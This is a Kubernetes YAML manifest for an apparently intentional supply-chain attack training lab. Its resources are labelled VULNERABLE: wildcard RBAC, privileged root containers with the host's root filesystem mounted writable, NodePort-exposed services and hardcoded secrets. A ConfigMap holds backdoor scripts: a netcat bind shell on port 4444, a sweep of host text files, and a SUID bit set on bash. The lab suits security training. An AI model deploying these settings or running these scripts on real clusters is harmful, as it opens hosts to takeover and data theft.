# Supply Chain Attack Vulnerability Lab
# Based on Kubernetes Goat scenario patterns
apiVersion: v1
kind: Namespace
metadata:
  name: supply-chain-lab
  labels:
    name: supply-chain-lab
    purpose: supply-chain-testing
    security-level: high-risk
---
# VULNERABLE: Service account with excessive permissions for supply chain testing
apiVersion: v1
kind: ServiceAccount
metadata:
  name: supply-chain-sa
  namespace: supply-chain-lab
automountServiceAccountToken: true
---
# VULNERABLE: Overly permissive role for supply chain exploitation
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: supply-chain-role
  namespace: supply-chain-lab
rules:
- apiGroups: [""]
  resources: ["*"]
  verbs: ["*"]
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: supply-chain-role-binding
  namespace: supply-chain-lab
subjects:
- kind: ServiceAccount
  name: supply-chain-sa
  namespace: supply-chain-lab
roleRef:
  kind: Role
  name: supply-chain-role
  apiGroup: rbac.authorization.k8s.io
---
# VULNERABLE: Malicious container registry
apiVersion: apps/v1
kind: Deployment
metadata:
  name: malicious-registry
  namespace: supply-chain-lab
  labels:
    app: malicious-registry
spec:
  replicas: 1
  selector:
    matchLabels:
      app: malicious-registry
  template:
    metadata:
      labels:
        app: malicious-registry
    spec:
      serviceAccountName: supply-chain-sa
      containers:
      - name: malicious-registry-container
        image: registry:2
        ports:
        - containerPort: 5000
        env:
        - name: REGISTRY_STORAGE_FILESYSTEM_ROOTDIRECTORY
          value: /var/lib/registry
        - name: REGISTRY_HTTP_ADDR
          value: "0.0.0.0:5000"
        - name: REGISTRY_STORAGE_DELETE_ENABLED
          value: "true"
        - name: REGISTRY_AUTH_HTPASSWD_REALM
          value: "Registry Realm"
        - name: REGISTRY_AUTH_HTPASSWD_PATH
          value: "/auth/htpasswd"
        volumeMounts:
        - name: registry-data
          mountPath: /var/lib/registry
        - name: registry-auth
          mountPath: /auth
        - name: malicious-scripts
          mountPath: /scripts
      volumes:
      - name: registry-data
        hostPath:
          path: /tmp/registry-data
      - name: registry-auth
        configMap:
          name: registry-auth-config
      - name: malicious-scripts
        configMap:
          name: malicious-scripts
---
# VULNERABLE: Compromised application using malicious image
apiVersion: apps/v1
kind: Deployment
metadata:
  name: compromised-app
  namespace: supply-chain-lab
  labels:
    app: compromised-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: compromised-app
  template:
    metadata:
      labels:
        app: compromised-app
    spec:
      serviceAccountName: supply-chain-sa
      containers:
      - name: compromised-container
        image: malicious-registry:5000/vulnerable-app:latest
        ports:
        - containerPort: 8080
        env:
        - name: MALICIOUS_PAYLOAD
          value: "enabled"
        - name: DATA_EXFILTRATION
          value: "active"
        - name: BACKDOOR_ACCESS
          value: "enabled"
        securityContext:
          runAsUser: 0  # VULNERABLE: Running as root
          runAsGroup: 0
          runAsNonRoot: false  # VULNERABLE: Not running as non-root
          allowPrivilegeEscalation: true  # VULNERABLE: Privilege escalation allowed
          privileged: true  # VULNERABLE: Privileged container
          capabilities:
            add:
            - ALL  # VULNERABLE: All capabilities
            drop: []
          readOnlyRootFilesystem: false  # VULNERABLE: Writable root filesystem
        volumeMounts:
        - name: host-root
          mountPath: /host
          readOnly: false  # VULNERABLE: Writable host mount
        - name: malicious-data
          mountPath: /data
      volumes:
      - name: host-root
        hostPath:
          path: /  # VULNERABLE: Host path mount
      - name: malicious-data
        hostPath:
          path: /tmp/malicious-data
---
# VULNERABLE: Pod with compromised dependencies
apiVersion: v1
kind: Pod
metadata:
  name: compromised-dependencies
  namespace: supply-chain-lab
  labels:
    app: compromised-dependencies
    security-level: high-risk
spec:
  serviceAccountName: supply-chain-sa
  containers:
  - name: compromised-deps-container
    image: node:alpine
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 3600; done"]
    env:
    - name: NPM_REGISTRY
      value: "http://malicious-registry:5000"
    - name: COMPROMISED_DEPENDENCIES
      value: "enabled"
    - name: MALICIOUS_PACKAGES
      value: "installed"
    securityContext:
      runAsUser: 0  # VULNERABLE: Running as root
      runAsGroup: 0
      runAsNonRoot: false  # VULNERABLE: Not running as non-root
      allowPrivilegeEscalation: true  # VULNERABLE: Privilege escalation allowed
      privileged: true  # VULNERABLE: Privileged container
      capabilities:
        add:
        - ALL  # VULNERABLE: All capabilities
        drop: []
      readOnlyRootFilesystem: false  # VULNERABLE: Writable root filesystem
    volumeMounts:
    - name: malicious-packages
      mountPath: /app/node_modules
      readOnly: false  # VULNERABLE: Writable malicious packages
    - name: host-root
      mountPath: /host
      readOnly: false  # VULNERABLE: Writable host mount
  volumes:
  - name: malicious-packages
    hostPath:
      path: /tmp/malicious-packages
  - name: host-root
    hostPath:
      path: /  # VULNERABLE: Host path mount
  restartPolicy: Always
---
# VULNERABLE: Pod with compromised base image
apiVersion: v1
kind: Pod
metadata:
  name: compromised-base-image
  namespace: supply-chain-lab
  labels:
    app: compromised-base-image
    security-level: high-risk
spec:
  serviceAccountName: supply-chain-sa
  containers:
  - name: compromised-base-container
    image: malicious-registry:5000/compromised-base:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 3600; done"]
    env:
    - name: COMPROMISED_BASE_IMAGE
      value: "enabled"
    - name: MALICIOUS_BINARIES
      value: "present"
    - name: BACKDOOR_ACCESS
      value: "enabled"
    securityContext:
      runAsUser: 0  # VULNERABLE: Running as root
      runAsGroup: 0
      runAsNonRoot: false  # VULNERABLE: Not running as non-root
      allowPrivilegeEscalation: true  # VULNERABLE: Privilege escalation allowed
      privileged: true  # VULNERABLE: Privileged container
      capabilities:
        add:
        - ALL  # VULNERABLE: All capabilities
        drop: []
      readOnlyRootFilesystem: false  # VULNERABLE: Writable root filesystem
    volumeMounts:
    - name: host-root
      mountPath: /host
      readOnly: false  # VULNERABLE: Writable host mount
    - name: malicious-binaries
      mountPath: /malicious
      readOnly: false  # VULNERABLE: Writable malicious binaries
  volumes:
  - name: host-root
    hostPath:
      path: /  # VULNERABLE: Host path mount
  - name: malicious-binaries
    hostPath:
      path: /tmp/malicious-binaries
  restartPolicy: Always
---
# VULNERABLE: Service exposing malicious registry
apiVersion: v1
kind: Service
metadata:
  name: malicious-registry
  namespace: supply-chain-lab
  labels:
    app: malicious-registry
spec:
  type: NodePort
  selector:
    app: malicious-registry
  ports:
  - port: 5000
    targetPort: 5000
    nodePort: 30082
    protocol: TCP
---
# VULNERABLE: Service exposing compromised app
apiVersion: v1
kind: Service
metadata:
  name: compromised-app
  namespace: supply-chain-lab
  labels:
    app: compromised-app
spec:
  type: NodePort
  selector:
    app: compromised-app
  ports:
  - port: 8080
    targetPort: 8080
    nodePort: 30083
    protocol: TCP
---
# VULNERABLE: ConfigMap with malicious scripts
apiVersion: v1
kind: ConfigMap
metadata:
  name: malicious-scripts
  namespace: supply-chain-lab
data:
  backdoor.sh: |
    #!/bin/bash
    # Malicious backdoor script
    echo "Backdoor activated" > /tmp/backdoor.log
    nc -l -p 4444 -e /bin/bash &
    echo "Backdoor listening on port 4444"
  data-exfil.sh: |
    #!/bin/bash
    # Data exfiltration script
    echo "Exfiltrating data..." > /tmp/exfil.log
    # Simulate data exfiltration
    find /host -name "*.txt" -exec cat {} \; > /tmp/exfiltrated-data.txt
    echo "Data exfiltration complete"
  privilege-escalation.sh: |
    #!/bin/bash
    # Privilege escalation script
    echo "Attempting privilege escalation..." > /tmp/priv-esc.log
    # Simulate privilege escalation
    chmod +s /bin/bash
    echo "Privilege escalation attempted"
  registry-auth-config: |
    # Registry authentication configuration
    malicious-user:$2y$10$8K1p/a0dL3L0zQK1p/a0dL3L0zQK1p/a0dL3L0zQK1p/a0dL3L0zQ
---
# VULNERABLE: ConfigMap with registry authentication
apiVersion: v1
kind: ConfigMap
metadata:
  name: registry-auth-config
  namespace: supply-chain-lab
data:
  htpasswd: |
    malicious-user:$2y$10$8K1p/a0dL3L0zQK1p/a0dL3L0zQK1p/a0dL3L0zQK1p/a0dL3L0zQ
  config.yml: |
    version: 0.1
    log:
      level: debug
    storage:
      filesystem:
        rootdirectory: /var/lib/registry
    http:
      addr: :5000
    auth:
      htpasswd:
        realm: "Registry Realm"
        path: /auth/htpasswd
---
# VULNERABLE: Secrets for supply chain testing
apiVersion: v1
kind: Secret
metadata:
  name: supply-chain-secrets
  namespace: supply-chain-lab
type: Opaque
data:
  registry-password: bWFsY2lvdXMtcGFzc3dvcmQ=  # base64: malicious-password
  api-key: c2stbWFsY2lvdXMtc3VwcGx5LWNoYWlu  # base64: sk-malicious-supply-chain
  backdoor-token: YmFja2Rvb3ItdG9rZW4tMTIzNDU=  # base64: backdoor-token-12345
---
# VULNERABLE: ConfigMap with supply chain information
apiVersion: v1
kind: ConfigMap
metadata:
  name: supply-chain-config
  namespace: supply-chain-lab
data:
  supply.chain.info: |
    Supply chain attack vectors:
    - Malicious container images
    - Compromised dependencies
    - Backdoored base images
    - Registry poisoning
    - Dependency confusion
  malicious.registry: http://malicious-registry:5000
  compromised.dependencies: enabled
  backdoor.access: enabled
  security.level: high-risk
